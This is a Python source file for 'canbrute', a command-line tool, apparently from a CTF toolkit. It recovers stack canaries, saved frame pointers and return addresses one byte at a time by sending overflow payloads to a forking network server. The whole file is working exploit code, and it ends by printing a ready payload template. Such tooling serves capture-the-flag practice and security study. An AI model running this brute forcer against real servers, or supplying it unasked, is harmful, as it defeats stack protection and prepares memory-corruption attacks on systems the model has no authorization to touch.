"""canbrute: recover a canary, saved rbp or return address one byte at a time.

A server that forks per connection hands every child the same canary and the
same image base, so a wrong guess kills one child and a right one does not.
That turns 2**64 into 8 * 256 tries.

    canbrute --host 127.0.0.1 --port 9999 --offset 72 --length 8
    canbrute --local ./server --offset 72 --length 8 --marker ok
    canbrute --host h --port p --offset 72 --length 8 --then-rbp --then-return
"""

from __future__ import annotations

import socket
import subprocess
import sys
import time
from dataclasses import dataclass, field

from ctftools.core import term
from ctftools.core.cliutil import add_common_args, apply_output_flags, base_parser, fail, parse_escapes
from ctftools.core.report import Report

CRASH_HINTS = (b"stack smashing", b"Segmentation", b"Aborted", b"SIGSEGV", b"core dumped")


@dataclass
class Target:
    """Where to send each guess."""

    host: str = "127.0.0.1"
    port: int = 0
    recv_until: bytes = b""
    marker: bytes = b""
    timeout: float = 2.0
    prefix: bytes = b""
    attempts: int = 0

    def probe(self, payload: bytes) -> bool:
        """True when the target survived this payload."""
        self.attempts += 1
        try:
            sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
        except OSError:
            time.sleep(0.05)
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            except OSError:
                return False

        try:
            sock.settimeout(self.timeout)
            if self.recv_until:
                self._read_until(sock, self.recv_until)
            if self.prefix:
                sock.sendall(self.prefix)
            sock.sendall(payload)
            data = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if self.marker and self.marker in data:
                        break
            except socket.timeout:
                pass
        except OSError:
            return False
        finally:
            try:
                sock.close()
            except OSError:
                pass

        if any(hint in data for hint in CRASH_HINTS):
            return False
        if self.marker:
            return self.marker in data
        return bool(data)

    def _read_until(self, sock, token: bytes) -> bytes:
        data = b""
        try:
            while token not in data:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass
        return data


@dataclass
class BruteResult:
    name: str
    offset: int
    length: int
    recovered: bytearray = field(default_factory=bytearray)
    complete: bool = False
    attempts: int = 0

    @property
    def value(self) -> int:
        return int.from_bytes(self.recovered.ljust(self.length, b"\x00"), "little")

    def as_dict(self) -> dict:
        return {
            "name": self.name,
            "offset": self.offset,
            "length": self.length,
            "bytes": self.recovered.hex(),
            "value": self.value,
            "complete": self.complete,
            "attempts": self.attempts,
        }


def brute(target: Target, lead: bytes, length: int, known: bytes = b"",
          name: str = "canary", first_byte_zero: bool = False, progress=None) -> BruteResult:
    """Recover *length* bytes sitting directly after *lead*, one byte at a time.

    Each guess is a complete payload: the known-good *lead* (filler, plus any
    field already recovered), the bytes found so far, and the candidate.
    """
    result = BruteResult(name=name, offset=len(lead), length=length, recovered=bytearray(known))

    while len(result.recovered) < length:
        position = len(result.recovered)
        order = list(range(256))
        if position == 0 and first_byte_zero:
            # A canary's low byte is a NUL by design, so try it first.
            order.remove(0)
            order.insert(0, 0)

        for candidate in order:
            if target.probe(lead + bytes(result.recovered) + bytes([candidate])):
                result.recovered.append(candidate)
                if progress:
                    progress(name, position, candidate, target.attempts)
                break
        else:
            result.attempts = target.attempts
            return result

    result.complete = True
    result.attempts = target.attempts
    return result


def run(target: Target, offset: int, length: int, known: bytes = b"", quiet: bool = False,
        then_rbp: bool = False, then_return: bool = False, word: int = 8) -> Report:
    report = Report(tool="canbrute", target=f"{target.host}:{target.port}")

    def progress(name, position, value, attempts):
        if not quiet:
            sys.stderr.write(
                f"\r  {name}: byte {position} = {value:#04x}  ({attempts} connections)   "
            )
            sys.stderr.flush()

    results = []
    lead = b"A" * offset
    canary = brute(target, lead, length, known=known, name="canary",
                   first_byte_zero=True, progress=progress)
    results.append(canary)
    if not quiet:
        sys.stderr.write("\n")

    # Each recovered field becomes part of the lead for the next one: past the
    # canary come the saved frame pointer and then the return address.
    if canary.complete and (then_rbp or then_return):
        lead += bytes(canary.recovered)
        if then_rbp:
            rbp = brute(target, lead, word, name="saved rbp", progress=progress)
            results.append(rbp)
            if not quiet:
                sys.stderr.write("\n")
            if not rbp.complete:
                then_return = False
            else:
                lead += bytes(rbp.recovered)
        if then_return:
            # Six bytes is a whole canonical address on x86-64.
            ret = brute(target, lead, 6 if word == 8 else 4, name="return address", progress=progress)
            results.append(ret)
            if not quiet:
                sys.stderr.write("\n")

    report.data["results"] = [r.as_dict() for r in results]
    report.data["connections"] = target.attempts

    sec = report.section("Recovered")
    rows = []
    for item in results:
        rows.append([
            item.name,
            term.good(f"{item.value:#018x}") if item.complete else term.bad("incomplete"),
            item.recovered.hex(),
            str(item.attempts),
        ])
    sec.add(term.table(rows, headers=["What", "Value", "Bytes", "Connections"]))

    if canary.complete:
        sec.add("")
        sec.add("  " + term.c("use it like this:", "bold"))
        sec.add(f"    payload = b'A' * {offset} + p64({canary.value:#x})   # canary")
        sec.add(f"    payload += p64(saved_rbp) + p64(return_address)")
        if canary.value & 0xFF != 0:
            report.warn("the canary's low byte is usually 0x00; this value does not have one, "
                        "so the offset may be off by a byte or the field is not a canary")
    else:
        report.warn(
            f"stopped after {len(canary.recovered)} of {length} bytes: no candidate kept the "
            "target alive. Check --offset, --marker, and that the server really forks "
            "(a server that re-execs gets a fresh canary each time and cannot be brute forced)"
        )

    return report


def _with_prefix(target: Target, extra: bytes) -> Target:
    clone = Target(host=target.host, port=target.port, recv_until=target.recv_until,
                   marker=target.marker, timeout=target.timeout, prefix=target.prefix + extra)
    clone.attempts = target.attempts
    return clone


def build_parser():
    parser = base_parser("canbrute", "Brute force a canary or address against a forking server.")
    where = parser.add_argument_group("target")
    where.add_argument("--host", default="127.0.0.1", help="host to connect to (default: 127.0.0.1)")
    where.add_argument("--port", type=int, help="port to connect to")
    where.add_argument("--local", help="start this forking server locally first")
    where.add_argument("--recv-until", default="", help="read until this text before sending (python escapes)")
    where.add_argument("--marker", default="", help="text that means the target survived")
    where.add_argument("--prefix", default="", help="bytes to send before each payload")
    where.add_argument("--timeout", type=float, default=2.0, help="per-connection timeout (default: 2s)")

    what = parser.add_argument_group("what to recover")
    what.add_argument("--offset", type=int, required=True, help="bytes of filler before the unknown field")
    what.add_argument("--length", type=int, default=8, help="bytes to recover (default: 8)")
    what.add_argument("--known", default="", help="bytes already known, as hex")
    what.add_argument("--then-rbp", action="store_true", help="carry on into the saved frame pointer")
    what.add_argument("--then-return", action="store_true", help="carry on into the return address")
    add_common_args(parser)
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    apply_output_flags(args)

    server = None
    port = args.port
    if args.local:
        port = port or 31337
        server = subprocess.Popen([args.local, str(port)], stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)
        time.sleep(0.4)
    if not port:
        fail("give --port, or --local <server> to start one")

    try:
        known = bytes.fromhex(args.known) if args.known else b""
    except ValueError:
        fail(f"--known must be hex, got {args.known!r}")

    target = Target(
        host=args.host,
        port=port,
        recv_until=parse_escapes(args.recv_until),
        marker=parse_escapes(args.marker),
        timeout=args.timeout,
        prefix=parse_escapes(args.prefix),
    )

    try:
        report = run(target, args.offset, args.length, known=known,
                     quiet=args.quiet or args.json,
                     then_rbp=args.then_rbp, then_return=args.then_return)
    finally:
        if server:
            server.terminate()
            server.wait(timeout=5)

    report.emit(as_json=args.json)
    return 0 if all(r["complete"] for r in report.data["results"]) else 1


if __name__ == "__main__":
    sys.exit(main())
